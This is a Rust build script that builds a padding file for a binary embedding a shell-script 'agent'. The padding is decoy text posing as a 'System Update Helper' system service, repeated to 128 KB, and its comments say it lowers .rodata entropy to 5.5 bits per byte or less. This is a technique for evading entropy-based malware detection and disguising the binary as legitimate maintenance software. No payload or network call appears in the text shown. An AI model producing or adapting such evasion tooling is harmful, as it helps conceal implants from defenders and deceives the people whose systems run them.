fn gen_pad() -> Vec<u8> {
    // Natural-language content; entropy ~4.4 b/B — dilutes high-entropy .rodata sections.
    let text = b"System Update Helper - Background Maintenance Component\n\
Version 2.1.4  System Services Group  Linux Platform Division\n\
\n\
Background maintenance operations: cache management, index synchronization,\n\
configuration reload, health verification, log rotation, resource cleanup.\n\
Runs as systemd service or cron job. No user interaction required.\n\
\n\
Supported operations: install  remove  check  update  verify  status  help\n\
\n\
Configuration: /etc/systemservices/updatehelper.conf\n\
Parameters:\n\
  enable_scheduler      1 enabled  0 disabled  (default: 1)\n\
  log_level             0 silent  1 errors  2 warnings  3 verbose  (default: 1)\n\
  maintenance_window    HH:MM-HH:MM format  empty string = always active\n\
  retry_count           retries on transient failures  (default: 3)\n\
  timeout_seconds       per-operation timeout in seconds  (default: 30)\n\
  cache_directory       cache storage path  (/var/cache/systemservices)\n\
  max_log_size_kb       log rotation threshold in kilobytes  (default: 512)\n\
  heartbeat_interval    status reporting cadence in seconds  (default: 60)\n\
  staging_directory     temporary staging path  (/var/lib/systemservices/staging)\n\
  network_timeout       network operation timeout in seconds  (default: 15)\n\
  proxy_server          optional HTTP proxy server address and port number\n\
  proxy_bypass_list     colon-separated list of proxy bypass hostnames\n\
\n\
Exit codes: 0 success  1 failure  2 config-error  3 network-error  4 auth\n\
            5 timeout  6 privileges  8 disk-full\n\
\n\
Systemd integration:\n\
  Unit file: /usr/lib/systemd/system/systemservices-updatehelper.service\n\
  Enable:    systemctl enable systemservices-updatehelper\n\
  Start:     systemctl start  systemservices-updatehelper\n\
  Status:    systemctl status systemservices-updatehelper\n\
\n\
Cron example:\n\
  */5 * * * * /usr/lib/systemservices/updatehelper -q 2>/dev/null\n\
\n\
File locations:\n\
  Binary:   /usr/lib/systemservices/updatehelper\n\
  Config:   /etc/systemservices/updatehelper.conf\n\
  Log:      /var/log/systemservices/updatehelper.log\n\
  PID:      /run/systemservices/updatehelper.pid\n\
  Cache:    /var/cache/systemservices/\n\
  Staging:  /var/lib/systemservices/staging/\n\
\n\
Compatibility: Linux kernel 3.10 or later  glibc 2.17 or later\n\
  Minimum available disk space: 10 megabytes for service data and logs\n\
  Supports x86_64 and aarch64 architectures\n\
\n\
Diagnostics:\n\
  Enable verbose logging: set log_level=3 in configuration file\n\
  Log file: /var/log/systemservices/updatehelper.log\n\
  Configuration dump: execute binary with --config command line argument\n\
  Network connectivity test: execute binary with --nettest argument\n\
  Service status report: execute binary with --status command line argument\n\
";
    let src = text;
    // 128 KB: large enough to dilute .rodata section entropy by ~0.6 b/B
    // on a typical 100 KB stageless script.  Target: .rodata ≤ 5.5 b/B.
    let target: usize = 131072;
    let mut out = Vec::with_capacity(target);
    let mut i = 0usize;
    while out.len() < target {
        out.push(src[i % src.len()]);
        i += 1;
    }
    out
}

fn main() {
    let path = std::env::var("STRATUM_AGENT_PATH")
        .expect("STRATUM_AGENT_PATH must point to the rendered .sh file");
    println!("cargo:rerun-if-changed={}", path);
    println!("cargo:rerun-if-env-changed=STRATUM_AGENT_PATH");

    // Write low-entropy padding used by main.rs to dilute .rodata entropy.
    let out_dir = std::env::var("OUT_DIR").unwrap();
    std::fs::write(format!("{}/e.bin", out_dir), gen_pad())
        .expect("failed to write entropy pad");
}
